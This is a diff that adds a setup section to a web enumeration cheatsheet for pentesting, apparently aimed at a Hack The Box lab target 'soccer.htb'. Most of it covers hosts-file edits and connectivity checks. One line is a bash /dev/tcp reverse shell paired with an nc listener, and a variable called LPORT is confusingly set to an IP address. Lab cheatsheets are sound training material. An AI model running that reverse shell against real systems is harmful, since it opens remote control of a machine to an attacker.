@@ -9,6 +9,55 @@ categories = ['cheatsheets']
 
 # Web Directory Enumeration Cheatsheet
 
+## Initial Setup and Preparation
+
+### Environment Variables Setup
+```bash
+# Set up common environment variables for pentesting
+export LPORT=10.10.14.13    # Your attacking machine IP
+export RPORT=10.10.11.194   # Target machine IP
+export LHOST=10.10.14.13    # Alternative naming
+export RHOST=10.10.11.194   # Alternative naming
+
+# Use in commands
+nc -nlvp $LPORT
+bash -i >& /dev/tcp/$LPORT/9001 0>&1
+```
+
+### Host File Modification
+```bash
+# Add target to hosts file for virtual host testing
+sudo nano /etc/hosts
+
+# Example entries
+10.10.11.194   soccer.htb
+10.10.11.194   soccer.htb soc-player.soccer.htb
+
+# Alternative using echo
+echo "10.10.11.194   soccer.htb" | sudo tee -a /etc/hosts
+echo "10.10.11.194   soc-player.soccer.htb" | sudo tee -a /etc/hosts
+
+# Verify hosts file entries
+cat /etc/hosts | grep htb
+```
+
+### Target Information Gathering
+```bash
+# Ping test connectivity
+ping -c 4 $RHOST
+ping -c 4 soccer.htb
+
+# Quick port check
+nc -zv $RHOST 80
+nc -zv $RHOST 443
+
+# DNS resolution check
+nslookup soccer.htb
+dig soccer.htb
+```
+
+---
+
 ## Gobuster
 
 ### Basic Directory Enumeration
